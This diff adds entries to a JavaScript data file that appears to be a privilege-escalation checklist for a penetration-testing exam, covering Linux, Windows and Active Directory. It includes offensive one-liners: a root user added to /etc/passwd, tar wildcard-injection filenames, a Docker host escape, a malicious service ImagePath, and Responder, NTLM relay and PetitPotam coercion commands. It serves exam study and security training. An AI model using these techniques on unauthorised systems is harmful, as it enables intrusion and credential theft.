+    kw:["ms-DS-MachineAccountQuota","noPac","sAMAccountName","CVE-2021-42278"],
+    cmds:[{t:"crackmapexec ldap <DC> -u user -p pass -M maq"},{t:"# add computer: impacket-addcomputer when quota > 0",cmt:1}],
+    note:"Quota > 0 unlocks RBCD even without owning an existing machine. Check it before ruling out delegation paths." },
+
+  { id:"a-recon", os:"ad", prio:"low", title:"Domain recon: users, groups, policy, trusts",
+    why:"User lists feed roasting, the password policy sets your spray lockout budget, and trusts reveal reachable domains.",
+    kw:["net group","Domain Admins","password policy","trust","enum4linux"],
+    cmds:[{t:"crackmapexec smb <DC> -u user -p pass --users --groups --pass-pol"},{t:"enum4linux-ng -A <DC>"}],
+    note:"Build the user list and read the lockout threshold BEFORE any password spray, so you don't lock out accounts mid-exam." },
+  { id:"a-sessions", os:"ad", prio:"low", title:"Logged-on users & session hunting",
+    why:"Knowing where a privileged user is logged in tells you which host to compromise next for a useful token or hash.",
+    kw:["NetSessionEnum","Get-NetSession","loggedon","Find-DomainUserLocation"],
+    cmds:[{t:"crackmapexec smb <subnet> -u user -p pass --loggedon-users"},{t:"# PowerView: Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'",cmt:1}],
+    note:"A DA session on a box you can reach as local admin = token impersonation or LSASS dump. Pairs with the BloodHound path." },
+
+  { id:"a-spray", os:"ad", prio:"waste", title:"Blind password spraying without reading the lockout policy",
+    why:"Spraying before you know the lockout threshold locks domain accounts and can derail the whole exam network.",
+    kw:["lockout","badPwdCount","spray"],
+    cmds:[{t:"# read --pass-pol FIRST, then spray 1 password < threshold with a delay",cmt:1}],
+    note:"One password across many users, spaced under the lockout window — never many passwords at one account. Policy-first, always." },
+  { id:"a-roast-all", os:"ad", prio:"waste", title:"Cracking every roast hash / collecting without analysing",
+    why:"Grinding uncrackable hashes or staring at a full BloodHound graph burns time that a targeted DA-path query would save.",
+    kw:["hashcat","Shortest Path","low-priv"],
+    cmds:[{t:"# triage by privilege first: which cracked account actually moves you forward?",cmt:1}],
+    note:"A cracked low-priv service account that leads nowhere is a rabbit hole. Chase hashes and paths that reach a privileged group." },
+
+  /* ========== LINUX (extended) ========== */
+  { id:"l-ldpreload", os:"lin", prio:"crit", title:"sudo env_keep LD_PRELOAD / LD_LIBRARY_PATH",
+    why:"If sudo preserves LD_PRELOAD or LD_LIBRARY_PATH, you load a malicious shared object into a root command and execute as root.",
+    kw:["env_keep","LD_PRELOAD","LD_LIBRARY_PATH","SETENV"],
+    cmds:[{t:"sudo -l   # look for env_keep+=LD_PRELOAD or (root) SETENV:"},{t:"# compile a .so with an init constructor, run the allowed sudo cmd with LD_PRELOAD=",cmt:1}],
+    note:"env_keep LD_PRELOAD is a near-instant win on any one sudo-allowed binary. Pair with the sudo -l output you already captured." },
+  { id:"l-sudover", os:"lin", prio:"crit", title:"Vulnerable sudo version (Baron Samedit / pwfeedback)",
+    why:"sudo < 1.9.5p2 (CVE-2021-3156) gives root via heap overflow; pwfeedback is a separate older bug. PEAS prints the version.",
+    kw:["Sudo version","1.8","1.9","pwfeedback","CVE-2021-3156"],
+    cmds:[{t:"sudo --version | head -1"},{t:"sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')   # crash = likely vulnerable",cmt:0}],
+    note:"Baron Samedit (1.8.2–1.9.5p1) needs no sudo rights at all. Confirm the exact version against the CVE range before firing a public PoC." },
+  { id:"l-pkexec", os:"lin", prio:"crit", title:"PwnKit — pkexec / polkit (CVE-2021-4034)",
+    why:"A memory-corruption bug in pkexec gives any local user root on most 2009–2022 Linux installs. Extremely reliable.",
+    kw:["pkexec","polkit","CVE-2021-4034","PwnKit","/usr/bin/pkexec"],
+    cmds:[{t:"ls -l /usr/bin/pkexec   # present + SUID = candidate"},{t:"pkexec --version"}],
+    note:"One of the most dependable Linux LPEs on exam-era boxes. PEAS flags pkexec under SUID; confirm polkit version isn't patched." },
+  { id:"l-passwdwrite", os:"lin", prio:"crit", title:"Writable /etc/passwd, /etc/shadow or /etc/sudoers",
+    why:"Write access to these files lets you add a root-equivalent user or your own hash directly — immediate root.",
+    kw:["/etc/passwd","/etc/shadow","/etc/sudoers","Writable","is writable"],
+    cmds:[{t:"ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/"},{t:"# writable passwd: add 'root2:$(openssl passwd -1 pass):0:0::/root:/bin/bash'",cmt:1}],
+    note:"PEAS flags each writable config in red. A writable /etc/passwd is the single cleanest root path when the x-field trick applies." },
+  { id:"l-dockersock", os:"lin", prio:"crit", title:"Writable Docker socket / privileged container",
+    why:"Access to /var/run/docker.sock lets you launch a container mounting the host filesystem as root.",
+    kw:["docker.sock","/var/run/docker.sock","privileged","Writable docker socket"],
+    cmds:[{t:"ls -la /var/run/docker.sock"},{t:"docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # if socket writable",cmt:0}],
+    note:"Distinct from mere docker-group membership — a writable socket is a direct host-root escape. Verify the socket, not just the group." },
+  { id:"l-pathhijack", os:"lin", prio:"high", title:"Relative binary in root SUID / cron (PATH hijack)",
+    why:"A SUID binary or root cron job calling a command without an absolute path lets you plant your own in a writable PATH dir.",
+    kw:["strings","system(","relative path","writable folder in PATH","$PATH"],
+    cmds:[{t:"strings /path/to/suid-binary | grep -iE 'cp|cat|service|/bin'"},{t:"# prepend writable dir to PATH, drop a malicious binary of the called name",cmt:1}],
+    note:"Run strings/ltrace on any custom SUID binary to see what it calls. A bare 'service' or 'cp' call plus a writable PATH entry is the exploit." },
+  { id:"l-wildcard", os:"lin", prio:"high", title:"Wildcard injection in root cron (tar / rsync / chown)",
+    why:"A root job using * in a writable directory can be hijacked with filenames crafted as command-line switches (tar --checkpoint-action).",
+    kw:["*","tar","rsync","chown","cron","--checkpoint"],
+    cmds:[{t:"cat /etc/crontab   # look for e.g. 'tar czf backup.tgz *' in a dir you can write"},{t:"# touch '--checkpoint=1' '--checkpoint-action=exec=sh script.sh'",cmt:1}],
+    note:"Classic GTFOBins-adjacent trick. Needs a root cron using a wildcard in a directory you control — confirm both before building the payload files." },
+  { id:"l-pylib", os:"lin", prio:"high", title:"Writable Python module / library imported by root",
+    why:"If a root script imports a module from a directory you can write (or PYTHONPATH is loose), you inject code that runs as root.",
+    kw:["PYTHONPATH","import","writable",".py","site-packages"],
+    cmds:[{t:"# for a root-run script: check write perms on each imported module's path",cmt:1},{t:"ls -la $(python3 -c 'import sys;print(\"\\n\".join(sys.path))') 2>/dev/null"}],
+    note:"Library hijacking also applies to writable .so files loaded by root binaries. Check write access on everything the root process imports or links." },
+  { id:"l-systemd", os:"lin", prio:"high", title:"Writable systemd service / timer unit",
+    why:"A unit file or its referenced binary that you can edit runs your ExecStart as root when the service (re)starts or the timer fires.",
+    kw:["systemd",".service",".timer","ExecStart","Writable",".path"],
+    cmds:[{t:"find /etc/systemd /lib/systemd /run/systemd -writable 2>/dev/null"},{t:"systemctl list-timers --all"}],
+    note:"Check both the unit file and the binary it points to for write access. Timers and .path units give you a trigger even without manual restart rights." },
+  { id:"l-sudotoken", os:"lin", prio:"high", title:"Reusable sudo token / ptrace a sudo'd shell",
+    why:"If another shell authenticated sudo recently and ptrace_scope allows it, you can inject into it or reuse the cached token.",
+    kw:["ptrace_scope","sudo token","/proc","gdb"],
+    cmds:[{t:"cat /proc/sys/kernel/yama/ptrace_scope   # 0 = permissive"},{t:"# gdb -p <pid of a process owned by target user> to inject",cmt:1}],
+    note:"ptrace_scope=0 plus a process owned by a sudo-capable user is a lateral/vertical move. Situational but worth noting when direct paths dry up." },
+  { id:"l-shadowread", os:"lin", prio:"high", title:"Readable /etc/shadow or backup of it",
+    why:"If you can read shadow (or a backup/snapshot), crack the root hash offline and su.",
+    kw:["/etc/shadow","readable","$6$","backup","shadow.bak"],
+    cmds:[{t:"cat /etc/shadow 2>/dev/null; find / -name 'shadow*' 2>/dev/null"},{t:"# unshadow passwd shadow > h; john h --wordlist=rockyou.txt",cmt:1}],
+    note:"Also check /var/backups/shadow.bak and old snapshots. A readable shadow is a direct root-hash crack — PEAS flags the permissions." },
+  { id:"l-mysqlroot", os:"lin", prio:"high", title:"Service running as root (MySQL UDF, etc.)",
+    why:"A database or daemon running as root with a known/blank password can execute commands as root (MySQL raptor UDF, Redis, etc.).",
+    kw:["running as root","mysql","redis","root@localhost","UDF"],
+    cmds:[{t:"ps aux | grep -iE 'mysql|redis|postgres' | grep root"},{t:"mysql -u root -p   # try blank / reused creds, then UDF or INTO OUTFILE",cmt:0}],
+    note:"The point is which account the service runs as, not just that it exists. A root-run DB with weak auth is a command-exec primitive." },
+  { id:"l-logrotate", os:"lin", prio:"med", title:"logrotate abuse (logrotten) & writable logs",
+    why:"A race in logrotate run as root against a log directory you control can give arbitrary root write.",
+    kw:["logrotate","logrotten","/var/log","create","Writable log"],
+    cmds:[{t:"cat /etc/logrotate.conf /etc/logrotate.d/* 2>/dev/null"},{t:"logrotate --version"}],
+    note:"Niche and version-dependent — try it only after the mainstream cron/SUID/sudo paths. Needs write access to a rotated log's directory." },
+  { id:"l-screen", os:"lin", prio:"med", title:"Shared screen / tmux session owned by root",
+    why:"A detached root screen or tmux socket you can access attaches you straight into a root shell.",
+    kw:["screen","tmux","/tmp/tmux","S-root","detached"],
+    cmds:[{t:"screen -ls; ls -la /tmp/screen* /tmp/tmux* 2>/dev/null"},{t:"tmux -S /tmp/<socket> attach   # if socket is accessible",cmt:0}],
+    note:"Also check for old setuid screen (CVE-2017-5618). Accessible root multiplexer sockets are a quick, quiet win when present." },
+  { id:"l-procenv", os:"lin", prio:"med", title:"Secrets in /proc/*/environ, cmdline & memory",
+    why:"Process environment and command lines of other users' processes often leak passwords passed as arguments or env vars.",
+    kw:["/proc","environ","cmdline","password=","--password"],
+    cmds:[{t:"cat /proc/*/cmdline 2>/dev/null | tr '\\000' ' ' | grep -iE 'pass|key|token'"},{t:"grep -z -i pass /proc/*/environ 2>/dev/null"}],
+    note:"Creds passed on a command line are visible in ps/cmdline to everyone. Cheap check that frequently yields a reusable password." },
+  { id:"l-container", os:"lin", prio:"med", title:"Am I in a container? (escape surface)",
+    why:"If this is a container, root inside it plus a loose capability or mounted socket/host path can escape to the host.",
+    kw:[".dockerenv","cgroup","CAP_SYS_ADMIN","container","overlay"],
+    cmds:[{t:"ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup"},{t:"capsh --print; mount | grep -iE 'host|docker'"}],
+    note:"Shift focus from 'root on the box' to 'escape the box': check mounted host paths, the docker socket, and dangerous caps (SYS_ADMIN, SYS_PTRACE)." },
+  { id:"l-initrc", os:"lin", prio:"med", title:"Writable init / rc / profile / motd scripts",
+    why:"Scripts sourced at boot or login as root (init.d, rc.local, /etc/profile.d, update-motd.d) run your code on the next trigger.",
+    kw:["rc.local","init.d","profile.d","update-motd.d","Writable"],
+    cmds:[{t:"ls -la /etc/init.d/ /etc/rc.local /etc/profile.d/ /etc/update-motd.d/ 2>/dev/null"}],
+    note:"update-motd.d runs as root on SSH login and is a well-known exam trick. Confirm write access and that the trigger actually fires in your window." },
+  { id:"l-groups", os:"lin", prio:"low", title:"Dangerous secondary group membership",
+    why:"Groups like disk, adm, shadow, video, lxd, docker grant file/device access that escalates (disk → read raw fs → shadow).",
+    kw:["disk","adm","shadow","video","lxd","id"],
+    cmds:[{t:"id; groups"},{t:"# disk group: debugfs /dev/sdaX then read /etc/shadow or /root",cmt:1}],
+    note:"'disk' lets you read the raw device and pull root's files or shadow. Map every non-default group to what it unlocks before dismissing this." },
+  { id:"l-worldwrite", os:"lin", prio:"low", title:"World-writable files/dirs used by root",
+    why:"Any root-executed or root-read file that is world-writable is a latent escalation if you can find what consumes it.",
+    kw:["o+w","world-writable","-rwxrwxrwx","Writable"],
+    cmds:[{t:"find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'"},{t:"find / -perm -o+w -type d 2>/dev/null"}],
+    note:"Lots of noise here — cross-reference hits against cron, services, and root processes rather than treating every writable file as a win." },
+  { id:"l-coredump", os:"lin", prio:"low", title:"Core dumps, backups & readable sensitive files",
+    why:"Core dumps and stray backups can contain memory with credentials or keys; readable config/key files enable reuse.",
+    kw:["core","*.bak","*.old","config",".kdbx"],
+    cmds:[{t:"find / -name 'core' -o -name '*.bak' -o -name '*.old' 2>/dev/null"},{t:"find / -name '*.kdbx' -o -name '*.pem' 2>/dev/null"}],
+    note:"KeePass .kdbx, PEM keys, and .bak configs are frequent credential sources. Low as a direct win, high when the password reuses elsewhere." },
+  { id:"l-exploitspam", os:"lin", prio:"waste", title:"Firing every kernel-exploit suggester hit",
+    why:"linux-exploit-suggester lists dozens of 'possible' CVEs by version match; most fail or panic the box and waste huge time.",
+    kw:["linux-exploit-suggester","possible","CVE-","highly probable"],
+    cmds:[{t:"# treat suggester output as leads to verify, not a to-do list — prefer PwnKit/Samedit/DirtyPipe",cmt:1}],
+    note:"Match only the few well-known, reliable LPEs to the exact kernel/distro. Blind-firing exotic kernel PoCs is the top Linux time sink." },
+  { id:"l-shellshock", os:"lin", prio:"waste", title:"Ancient bugs on patched boxes (Shellshock, DirtyCow)",
+    why:"PEAS/suggesters still match these by version string, but modern or patched systems aren't vulnerable and DirtyCow can corrupt the box.",
+    kw:["Shellshock","DirtyCow","CVE-2014-6271","CVE-2016-5195"],
+    cmds:[{t:"# verify the actual patch level before touching DirtyCow — it can crash/corrupt the target",cmt:1}],
+    note:"DirtyCow in particular is unstable and can brick an exam machine. Only consider genuinely ancient targets, and prefer safer modern LPEs." },
+
+  /* ========== WINDOWS (extended) ========== */
+  { id:"w-sebackup", os:"win", prio:"crit", title:"SeBackup / SeRestore privilege",
+    why:"SeBackupPrivilege lets you read any file (SAM+SYSTEM hives → dump hashes); SeRestore lets you overwrite protected files.",
+    kw:["SeBackupPrivilege","SeRestorePrivilege","Enabled","whoami /priv"],
+    cmds:[{t:"whoami /priv"},{t:"reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive   # then secretsdump",cmt:0}],
+    note:"SeBackup → copy SAM/SYSTEM (or ntds.dit on a DC) and dump offline. A top-tier privilege whenever whoami /priv shows it Enabled." },
+  { id:"w-seloaddriver", os:"win", prio:"crit", title:"SeLoadDriver / vulnerable-driver load (BYOVD)",
+    why:"SeLoadDriverPrivilege lets you load a signed vulnerable driver (e.g. Capcom) and execute kernel code for SYSTEM.",
+    kw:["SeLoadDriverPrivilege","Capcom.sys","BYOVD","driver"],
+    cmds:[{t:"whoami /priv   # SeLoadDriverPrivilege"},{t:"# register + load a known-vulnerable signed driver, then exploit it",cmt:1}],
+    note:"Heavier and noisier than the Potato path; reach for it only when SeImpersonate isn't present. Confirm the privilege is actually Enabled." },
+  { id:"w-hivenightmare", os:"win", prio:"crit", title:"HiveNightmare / SeriousSAM — readable SAM via VSS",
+    why:"On vulnerable Win10/11 builds, non-admins can read SAM/SYSTEM/SECURITY from a shadow copy and dump local hashes.",
+    kw:["HiveNightmare","SeriousSAM","CVE-2021-36934","ShadowCopy","config\\SAM"],
+    cmds:[{t:"icacls C:\\Windows\\System32\\config\\SAM   # BUILTIN\\Users:(R) = vulnerable"},{t:"# copy hives from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\...",cmt:1}],
+    note:"The icacls check is the tell: if Users have read on SAM, you're in. Requires an existing shadow copy to pull the hives from." },
+  { id:"w-dllhijack", os:"win", prio:"crit", title:"DLL hijacking (writable dir in a service/app search path)",
+    why:"A privileged process loading a DLL by name from a directory you can write (or missing-DLL) runs your DLL in its context.",
+    kw:["DLL","search order","missing DLL","writable","PATH"],
+    cmds:[{t:"# ProcMon: filter Result=NAME NOT FOUND, Path ends .dll, loaded by a SYSTEM process",cmt:1},{t:"icacls \"C:\\path\\the\\app\\loads\\from\""}],
+    note:"Pair a missing or hijackable DLL with a writable directory on the search path. Also applies to writable PATH entries used by SYSTEM services." },
+  { id:"w-regautorun", os:"win", prio:"high", title:"Writable autorun — Run keys & Startup folder",
+    why:"A writable HKLM Run key or All-Users Startup folder executes your payload the next time an admin logs in.",
+    kw:["Run","CurrentVersion\\Run","Startup","Autorun","writable"],
+    cmds:[{t:"# PEAS 'Autorun' section flags writable autorun binaries/keys",cmt:1},{t:"icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""}],
+    note:"Depends on an admin logging in within your window. Check write access on both the key/folder and the binaries the autoruns point to." },
+  { id:"w-serviceregperm", os:"win", prio:"high", title:"Weak ACL on service registry key",
+    why:"Write access to a service's HKLM\\...\\Services key lets you change ImagePath to your binary — SYSTEM on restart.",
+    kw:["CurrentControlSet\\Services","ImagePath","WRITE","FullControl","reg"],
+    cmds:[{t:"# PEAS flags modifiable service registry keys",cmt:1},{t:"reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /d \"C:\\evil.exe\" /f"}],
+    note:"Distinct from binary/path perms — the reg key ACL alone is enough. Confirm you can restart the service or that it starts at boot." },
+  { id:"w-setakeown", os:"win", prio:"high", title:"SeTakeOwnership / SeManageVolume privilege",
+    why:"SeTakeOwnership lets you own and re-ACL any file (e.g. a SYSTEM-run binary); SeManageVolume can be chained to arbitrary write.",
+    kw:["SeTakeOwnershipPrivilege","SeManageVolumePrivilege","Enabled"],
+    cmds:[{t:"whoami /priv"},{t:"takeown /f \"C:\\Windows\\System32\\<target>.exe\" & icacls ... /grant user:F",cmt:0}],
+    note:"Take ownership of a file a SYSTEM service runs, replace it, trigger the service. Any Enabled privilege in whoami /priv deserves a lookup." },
+  { id:"w-storedapps", os:"win", prio:"high", title:"Stored creds in apps (PuTTY, WinSCP, VNC, OpenVPN)",
+    why:"Saved sessions and config files hold reusable or decryptable passwords that unlock other users/hosts.",
+    kw:["PuTTY","WinSCP","sessions","VNC","password","OpenVPN"],
+    cmds:[{t:"reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s"},{t:"# WinSCP.ini / VNC reg hold recoverable passwords",cmt:1}],
+    note:"WinSCP and VNC passwords are reversibly stored and trivially decrypted. PEAS surfaces these under its credential-hunting sections." },
+  { id:"w-pshist", os:"win", prio:"high", title:"PowerShell history, transcripts & event logs",
+    why:"PSReadline history and transcription logs frequently contain passwords typed on command lines.",
+    kw:["ConsoleHost_history","PSReadline","Transcript","Microsoft-Windows-PowerShell"],
+    cmds:[{t:"type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"},{t:"# also check Event ID 4104 script-block logs",cmt:1}],
+    note:"One of the highest-yield quiet checks on Windows. Admins paste creds into PowerShell constantly — grep history for pass/key/secret." },
+  { id:"w-iisconfig", os:"win", prio:"high", title:"IIS web.config — connection strings & machineKey",
+    why:"web.config and applicationHost.config hold DB connection strings, app-pool creds, and machineKeys enabling deserialization/forged tokens.",
+    kw:["web.config","connectionString","machineKey","applicationHost.config","app pool"],
+    cmds:[{t:"type C:\\inetpub\\wwwroot\\web.config"},{t:"%windir%\\system32\\inetsrv\\appcmd list apppool /text:* | findstr /i password",cmt:0}],
+    note:"App-pool identities and DB creds here often reuse to higher-priv accounts. machineKey disclosure enables ViewState RCE on ASP.NET apps." },
+  { id:"w-mssql", os:"win", prio:"high", title:"MSSQL — xp_cmdshell, impersonation & linked servers",
+    why:"Local or reachable SQL Server with sysadmin (or EXECUTE AS / linked-server trust) runs OS commands, often as the service account.",
+    kw:["MSSQL","sa","xp_cmdshell","IMPERSONATE","linked server"],
+    cmds:[{t:"# mssqlclient.py domain/user:pass@host  then: enable_xp_cmdshell",cmt:1},{t:"EXECUTE AS LOGIN='sa'; -- test impersonation chains"}],
+    note:"If the SQL service runs as a privileged account, xp_cmdshell → that context, often chaining to SeImpersonate → SYSTEM. Check linked-server trust too." },
+  { id:"w-privgroups", os:"win", prio:"med", title:"Privileged local groups (Backup Operators, etc.)",
+    why:"Membership in Backup Operators, Server Operators, DnsAdmins, Print Operators, or Hyper-V Admins each has a known escalation.",
+    kw:["Backup Operators","Server Operators","DnsAdmins","Print Operators","net localgroup"],
+    cmds:[{t:"whoami /groups"},{t:"net localgroup"}],
+    note:"Backup Operators → read SAM; DnsAdmins → load a DLL into the DNS service; Print Operators → SeLoadDriver. Map your groups to their known abuse." },
+  { id:"w-wsus", os:"win", prio:"med", title:"WSUS over HTTP (fake update injection)",
+    why:"If the client pulls updates from an HTTP WSUS server, a MITM or configured attacker server pushes a SYSTEM-level 'update'.",
+    kw:["WSUS","WUServer","http://","UseWUServer"],
+    cmds:[{t:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer"},{t:"# WUServer=http:// (not https) → WSUSpendu / PyWSUS",cmt:1}],
+    note:"Only exploitable when WUServer uses plain HTTP. Rare but decisive in enterprise images — PEAS reports the WSUS config." },
+  { id:"w-namedpipe", os:"win", prio:"med", title:"Named-pipe impersonation & RDP/saved creds",
+    why:"Getting a SYSTEM service to connect to your named pipe (or finding saved .rdp creds) yields a token or password to reuse.",
+    kw:["named pipe","\\\\.\\pipe\\","Default.rdp","cmdkey","RDP"],
+    cmds:[{t:"cmdkey /list   # saved RDP / domain creds"},{t:"dir /s *.rdp 2>nul & reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s"}],
+    note:"The Potato family is really named-pipe + token impersonation under the hood. Saved RDP creds are a quieter, simpler lateral/vertical move." },
+  { id:"w-printnightmare", os:"win", prio:"med", title:"Print Spooler — PrintNightmare (CVE-2021-34527)",
+    why:"A running, unpatched Print Spooler lets a low-priv user load a driver DLL as SYSTEM (local) or via the domain (remote).",
+    kw:["Spooler","PrintNightmare","CVE-2021-34527","spoolsv"],
+    cmds:[{t:"sc query spooler   # RUNNING + unpatched = candidate"},{t:"# local LPE variant drops a DLL via AddPrinterDriverEx",cmt:1}],
+    note:"Check the patch level, not just that the spooler runs. Also relevant on DCs for domain escalation — note it in the AD tab context too." },
+  { id:"w-credfiles", os:"win", prio:"med", title:"Filesystem-wide credential hunt (configs, scripts, XML)",
+    why:"Passwords live in unattend.xml, sysprep, .config, .ini, .ps1, Groups.xml, and bespoke app files across the disk.",
+    kw:["unattend.xml","sysprep","password","findstr","*.config"],
+    cmds:[{t:"findstr /si password *.xml *.ini *.config *.txt *.ps1 2>nul"},{t:"dir /s /b C:\\*pass* C:\\*cred* 2>nul"}],
+    note:"PEAS runs a version of this, but a manual findstr over app-specific extensions catches what its patterns miss. Always test found creds for reuse." },
+  { id:"w-installedvuln", os:"win", prio:"low", title:"Vulnerable third-party software versions",
+    why:"Outdated local software (and its own services/updaters running as SYSTEM) may have a public local privilege-escalation.",
+    kw:["Installed Software","version","updater","service"],
+    cmds:[{t:"wmic product get name,version"},{t:"reg query HKLM\\SOFTWARE /s /f DisplayVersion 2>nul | more"}],
+    note:"Weak permissions on a third-party app's install dir or its auto-updater service are more common than a version-specific CVE. Check both." },
+  { id:"w-schtasks2", os:"win", prio:"low", title:"Startup, GPO scripts & logon-triggered tasks",
+    why:"Logon/startup scripts (incl. GPO-pushed) and tasks triggered by events run at predictable times — useful if you can modify their target.",
+    kw:["Logon Scripts","GPO","Startup","schtasks","trigger"],
+    cmds:[{t:"schtasks /query /fo LIST /v | findstr /i \"TaskName Run Trigger\""},{t:"reg query \"HKCU\\Environment\" /v UserInitMprLogonScript"}],
+    note:"Complements the SYSTEM scheduled-task check — here the lever is a modifiable script plus a login/startup trigger you don't control the timing of." },
+  { id:"w-metasploitblind", os:"win", prio:"waste", title:"Blind local_exploit_suggester / kernel CVE spray",
+    why:"Meterpreter's suggester and systeminfo-based tools over-report kernel CVEs that usually fail or crash modern, patched hosts.",
+    kw:["local_exploit_suggester","kernel","appears vulnerable","systeminfo"],
+    cmds:[{t:"# verify a suggested kernel exploit's patch/build mapping before running it",cmt:1}],
+    note:"Token privileges, service misconfigs, and creds solve most Windows boxes. Kernel exploits are a last resort, not the opening move." },
+  { id:"w-uacwaste", os:"win", prio:"waste", title:"Chasing UAC bypass when you aren't admin yet",
+    why:"UAC bypasses only matter once you're in a medium-integrity admin context — they aren't a privesc from a standard user.",
+    kw:["UAC","integrity level","bypass","medium"],
+    cmds:[{t:"whoami /groups | findstr /i \"Label\"   # Medium vs High integrity\\ and admin membership",cmt:0}],
+    note:"If you're a non-admin user, a UAC bypass gives you nothing. Confirm you're an admin at medium integrity before spending time here." },
+
+  /* ========== AD / DOMAIN (extended) ========== */
+  { id:"a-responder", os:"ad", prio:"crit", title:"LLMNR / NBT-NS / mDNS poisoning (Responder)",
+    why:"Broadcast name-resolution poisoning captures NetNTLMv1/v2 hashes from hosts looking up bad names — often your first domain creds.",
+    kw:["LLMNR","NBT-NS","mDNS","NetNTLMv2","Responder"],
+    cmds:[{t:"responder -I eth0 -wP"},{t:"# crack: hashcat -m 5600 netntlm.txt rockyou.txt",cmt:1}],
+    note:"Passive-ish and high-yield on flat networks. Captured NetNTLMv2 cracks offline; if SMB signing is off, relay it instead of cracking." },
+  { id:"a-ntlmrelay", os:"ad", prio:"crit", title:"NTLM relay (SMB signing not required)",
+    why:"Relay captured/coerced NTLM auth to another host or to LDAP/ADCS to gain access or configure RBCD/shadow creds without cracking.",
+    kw:["ntlmrelayx","SMB signing","relay","LDAP","ADCS"],
+    cmds:[{t:"crackmapexec smb <subnet> --gen-relay-list targets.txt   # signing:False hosts"},{t:"impacket-ntlmrelayx -tf targets.txt -smb2support"}],
+    note:"The payoff of Responder/coercion when signing is disabled. Relay to LDAP for RBCD/shadow-cred, or to an ADCS web endpoint for ESC8." },
+  { id:"a-petitpotam", os:"ad", prio:"crit", title:"Authentication coercion (PetitPotam, PrinterBug, Coercer)",
+    why:"Coercing a privileged machine (often the DC) to authenticate to you enables relay to ADCS/LDAP — a common full-domain path.",
+    kw:["PetitPotam","PrinterBug","Coercer","MS-EFSR","SpoolSample"],
+    cmds:[{t:"petitpotam.py -u user -p pass <attacker-ip> <DC-ip>"},{t:"# combine with ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp (ESC8)",cmt:1}],
+    note:"Coercion + relay to ADCS (ESC8) gives a DC certificate → DCSync. One of the most reliable modern domain-takeover chains." },
+  { id:"a-shadowcred", os:"ad", prio:"crit", title:"Shadow Credentials (msDS-KeyCredentialLink)",
+    why:"Write access to a target's key-credential attribute lets you add your own key and authenticate as them via PKINIT — no password reset.",
+    kw:["msDS-KeyCredentialLink","Whisker","pywhisker","shadow credential","KeyCredential"],
+    cmds:[{t:"certipy shadow auto -u user@domain -p pass -account <target>"},{t:"# or pywhisker then gettgtpkinit → NT hash",cmt:1}],
+    note:"The quiet alternative to ForceChangePassword when you have GenericWrite/GenericAll over a user or computer. Needs ADCS/PKINIT in the domain." },
+  { id:"a-gmsa", os:"ad", prio:"high", title:"Readable gMSA password (ReadGMSAPassword)",
+    why:"If you can read a group-managed service account's blob, you recover its password/NT hash — often a privileged service identity.",
+    kw:["gMSA","msDS-ManagedPassword","ReadGMSAPassword","ServiceAccount"],
+    cmds:[{t:"# bloodyAD / gMSADumper.py -u user -p pass -d domain",cmt:1},{t:"crackmapexec ldap <DC> -u user -p pass --gmsa"}],
+    note:"BloodHound shows the ReadGMSAPassword edge. gMSAs frequently run privileged services, so the recovered hash often moves you up fast." },
+  { id:"a-smbsigning", os:"ad", prio:"high", title:"SMB signing not required (relay surface map)",
+    why:"Hosts without enforced SMB signing are relay targets — the enabler for every NTLM-relay chain above.",
+    kw:["signing:False","SMB signing","not required","relay"],
+    cmds:[{t:"crackmapexec smb <subnet> | grep 'signing:False'"},{t:"nmap --script smb2-security-mode -p445 <subnet>"}],
+    note:"Build this list early — it decides whether captured/coerced auth gets relayed (no cracking) or has to be cracked offline." },
+  { id:"a-printerbug", os:"ad", prio:"high", title:"Unconstrained delegation + PrinterBug → DC TGT",
+    why:"A host with unconstrained delegation that you control, plus coercing the DC to it, captures the DC's TGT for full compromise.",
+    kw:["unconstrained","TRUSTED_FOR_DELEGATION","PrinterBug","Rubeus monitor","TGT"],
+    cmds:[{t:"# Rubeus monitor on the unconstrained host, then coerce DC auth to it",cmt:1},{t:"# extracted DC TGT → DCSync / ptt",cmt:1}],
+    note:"The classic unconstrained-delegation takeover. Requires admin on the delegation host first — treat it as a chain, not a single step." },
+  { id:"a-descpw", os:"ad", prio:"high", title:"Passwords in user/computer description & info fields",
+    why:"Admins stash initial or service passwords in the description, info, or comment attributes readable by any domain user.",
+    kw:["description","info","comment","adminDescription","password"],
+    cmds:[{t:"crackmapexec ldap <DC> -u user -p pass -M get-desc-users"},{t:"# PowerView: Get-DomainUser | ? {$_.description} | select name,description",cmt:1}],
+    note:"Trivial, any-user-readable, and surprisingly common on exam-style domains. Always sweep description/info before deeper ACL work." },
+  { id:"a-pre2k", os:"ad", prio:"high", title:"Pre-created (pre-2k) computer accounts",
+    why:"A pre-staged computer account often has its password equal to the lowercase name — an easy authenticated foothold.",
+    kw:["pre2k","UF_WORKSTATION_TRUST","password = sAMAccountName","userAccountControl"],
+    cmds:[{t:"pre2k unauth -d domain -dc-ip <DC>"},{t:"# then authenticate as the machine account and enumerate further",cmt:1}],
+    note:"Needs no creds in the unauth mode. A recovered machine account enables LDAP enumeration and sometimes RBCD setup." },
+  { id:"a-trusts", os:"ad", prio:"med", title:"Domain & forest trusts, SID history",
+    why:"Trust relationships and SID history let you move between domains and, with a trust key or SID-history injection, escalate across them.",
+    kw:["trust","forest","SID history","sidHistory","netdom"],
+    cmds:[{t:"# PowerView: Get-DomainTrust / Get-DomainTrustMapping",cmt:1},{t:"nltest /domain_trusts /all_trusts"}],
+    note:"Map trusts once you own one domain — child→parent via the trust key or SID history is a known forest-escalation path. Mostly beyond single-box exams." },
